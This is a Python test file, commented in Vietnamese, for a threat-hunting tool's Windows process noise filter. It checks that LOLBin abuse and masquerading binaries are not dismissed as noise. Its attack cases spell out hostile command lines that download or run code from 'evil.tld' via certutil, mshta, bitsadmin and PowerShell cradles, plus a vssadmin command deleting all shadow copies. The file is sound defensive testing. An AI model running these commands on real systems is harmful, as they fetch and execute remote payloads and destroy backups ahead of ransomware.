# -*- coding: utf-8 -*-
"""
Bo loc tien trinh Windows - kiem CA HAI chieu (PHASE 1).

Mot bo loc tieng on chi duoc kiem theo chieu "co loc duoc nhieu khong" la mot bo
loc chua duoc kiem. Cau hoi dat gia hon la chieu nguoc lai: no co loc NHAM thu
dang le phai bao khong?

Day khong phai lo xa. Lam dung LOLBin dung DUNG nhi phan da ky, o DUNG duong dan
he thong - `C:\\Windows\\System32\\certutil.exe -urlcache -f http://...` khop moi
tieu chi "dang tin" cua mot bo loc theo duong dan. Neu bo loc chi xet noi nhi
phan nam, no se im lang dung vao lop tan cong ma cuoc san LOLBin sinh ra de tim,
va bao cao se sach hon truoc - sach vi da mu, khong phai vi da an toan.

Nen phan lon cac ca duoi day la ca AM TINH: chung dung mot tien trinh hop le lam
moi, roi hoi bo loc co nuot moi khong.
"""

from __future__ import print_function

import io
import json
import os
import sys

TESTS_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(os.path.dirname(TESTS_DIR))
for path in (os.path.join(PROJECT_ROOT, 'scripts'),
             os.path.join(PROJECT_ROOT, 'tests', 'detection_quality')):
    if path not in sys.path:
        sys.path.insert(0, path)

from harness import Suite  # noqa: E402
import ioc_quality as iq  # noqa: E402


def indicator(**fields):
    """Mot chi bao toi thieu. `evidence` rong de khong cham bo loc tu quan sat."""
    base = {'severity': 'INFO', 'evidence': [], 'type': 'Living Off The Land Binary'}
    base.update(fields)
    return base


def classify(**fields):
    return iq.noise_class(indicator(**fields), 'hunting_suspicious_processes.json')


def run():
    suite = Suite('Bo loc tien trinh Windows (PHASE 1)')

    # ---------------------------------------------------------------- duong
    print('\n[1] Duong dan tin cay + khong tham so -> hạ xuong tieng on')

    noise, reason = classify(process='cmd',
                             command_line=r'C:\WINDOWS\system32\cmd.exe')
    suite.check_equal('  cmd.exe tran trong System32 -> TRUSTED_OS_BINARY',
                      noise, iq.NOISE_TRUSTED_PATH)

    noise, _ = classify(process='powershell',
                        command_line=r'C:\windows\System32\WindowsPowerShell\v1.0\powershell.exe')
    suite.check_equal('  powershell.exe tran trong System32 -> TRUSTED_OS_BINARY',
                      noise, iq.NOISE_TRUSTED_PATH)

    noise, _ = classify(process='OneDrive',
                        command_line=r'"C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background',
                        type='Persistence: RunKey')
    suite.check_equal('  duong dan co ngoac kep + tham so lanh -> TRUSTED_OS_BINARY',
                      noise, iq.NOISE_TRUSTED_PATH)

    noise, _ = classify(process='svchost', command_line=None,
                        type='Network Connection')
    suite.check_equal('  svchost khong co dong lenh -> CORE_OS_PROCESS',
                      noise, iq.NOISE_CORE_PROCESS)

    noise, _ = classify(process='explorer', command_line=None,
                        type='Network Connection')
    suite.check_equal('  explorer khong co dong lenh -> CORE_OS_PROCESS',
                      noise, iq.NOISE_CORE_PROCESS)

    noise, _ = classify(process='MsMpEng', command_line=None,
                        type='Network Connection')
    suite.check_equal('  MsMpEng (Windows Defender) -> CORE_OS_PROCESS',
                      noise, iq.NOISE_CORE_PROCESS)

    # ------------------------------------------------------------------ am
    # Day moi la phan quan trong cua tep nay.
    print('\n[2] Cung nhi phan do, nhung hanh vi tan cong -> KHONG duoc nuot')

    attacks = [
        ('certutil tai tep tu Internet',
         r'C:\Windows\System32\certutil.exe -urlcache -split -f http://evil.tld/a.exe'),
        ('powershell voi lenh ma hoa base64',
         r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4A'),
        ('powershell download cradle',
         r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString("http://x")'),
        ('mshta chay noi dung tu xa',
         r'C:\Windows\System32\mshta.exe http://evil.tld/p.hta'),
        ('bitsadmin chuyen tep',
         r'C:\Windows\System32\bitsadmin.exe /transfer j http://evil.tld/a.exe C:\a.exe'),
        ('vssadmin xoa ban sao bong (tien de ma hoa tong tien)',
         r'C:\Windows\System32\vssadmin.exe delete shadows /all /quiet'),
    ]
    for label, command in attacks:
        noise, _ = classify(process='lolbin', command_line=command)
        suite.check('  %s -> KHONG bi ha xuong tieng on' % label,
                    noise != iq.NOISE_TRUSTED_PATH,
                    'noise_class=%r cho: %s' % (noise, command[:70]))

    print('\n[3] Nguy trang: ten dung, cho dung, nhung o sai thu muc')

    masquerade = [
        ('cmd.exe trong thu muc Temp cua nguoi dung',
         r'C:\Users\tamng\AppData\Local\Temp\cmd.exe'),
        ('svchost.exe trong AppData (thu muc nguoi dung ghi duoc)',
         r'C:\Users\tamng\AppData\Roaming\svchost.exe'),
        ('explorer.exe trong thu muc Downloads',
         r'C:\Users\tamng\Downloads\explorer.exe'),
        ('cmd.exe o goc o dia',
         r'C:\cmd.exe'),
    ]
    for label, command in masquerade:
        noise, _ = classify(process=os.path.basename(command).replace('.exe', ''),
                            command_line=command)
        suite.check('  %s -> KHONG bi ha xuong tieng on' % label,
                    noise != iq.NOISE_TRUSTED_PATH,
                    'noise_class=%r cho: %s' % (noise, command))

    print('\n[4] Muc do nghiem trong cao khoa ca hai bang')

    for severity in ('HIGH', 'CRITICAL'):
        noise, _ = classify(severity=severity, process='cmd',
                            command_line=r'C:\WINDOWS\system32\cmd.exe')
        suite.check('  nhi phan tin cay o muc %s -> KHONG bi nuot' % severity,
                    noise != iq.NOISE_TRUSTED_PATH, 'noise_class=%r' % (noise,))

        noise, _ = classify(severity=severity, process='svchost',
                            command_line=None, type='Network Connection')
        suite.check('  svchost o muc %s -> KHONG bi nuot' % severity,
                    noise != iq.NOISE_CORE_PROCESS, 'noise_class=%r' % (noise,))

    print('\n[5] Ten la thi khong duoc mien tru')

    for name in ('mimikatz', 'rundll32x', 'svch0st', 'nc'):
        noise, _ = classify(process=name, command_line=None,
                            type='Network Connection')
        suite.check('  tien trinh %r khong nam trong bang -> KHONG bi nuot' % name,
                    noise != iq.NOISE_CORE_PROCESS, 'noise_class=%r' % (noise,))

    print('\n[6] Tach duong dan khoi dong lenh')

    cases = [
        (r'"C:\Program Files\App\a.exe" --flag', r'C:\Program Files\App\a.exe'),
        (r'C:\Windows\System32\cmd.exe /c dir', r'C:\Windows\System32\cmd.exe'),
        (r'C:\Windows\System32\cmd.exe', r'C:\Windows\System32\cmd.exe'),
        ('', ''),
    ]
    for command, expected in cases:
        suite.check_equal('  executable_path(%r)' % (command[:40],),
                          iq.executable_path(command), expected)

    print('\n[7] Ly do ha diem phai tu khai la suy doan theo ten')

    _, reason = classify(process='svchost', command_line=None,
                         type='Network Connection')
    suite.check('  ly do CORE_OS_PROCESS noi ro la suy doan THEO TEN',
                reason and 'THEO T' in reason.upper(),
                'reason=%r' % (reason,))

    print('\n[8] Doi chieu state that: khong co phat hien CRITICAL/HIGH nao bi nuot')

    state_dir = os.path.join(PROJECT_ROOT, 'state')
    new_classes = (iq.NOISE_TRUSTED_PATH, iq.NOISE_CORE_PROCESS)
    checked_any = False
    for filename in os.listdir(state_dir):
        if not filename.startswith('hunting_'):
            continue
        try:
            with io.open(os.path.join(state_dir, filename), encoding='utf-8') as handle:
                data = json.load(handle)
        except (ValueError, IOError):
            continue
        for item in data.get('indicators') or []:
            checked_any = True
            noise, _ = iq.noise_class(item, filename)
            if item.get('severity') in ('CRITICAL', 'HIGH'):
                suite.check('  %s: phat hien %s khong bi bo loc moi nuot'
                            % (filename, item.get('severity')),
                            noise not in new_classes,
                            'noise_class=%r type=%r' % (noise, item.get('type')))
    suite.check('  co doc duoc chi bao that de doi chieu', checked_any)

    return suite


if __name__ == '__main__':
    if sys.platform == 'win32':
        try:
            sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
        except AttributeError:
            pass
    from harness import render
    sys.exit(render([run()]))
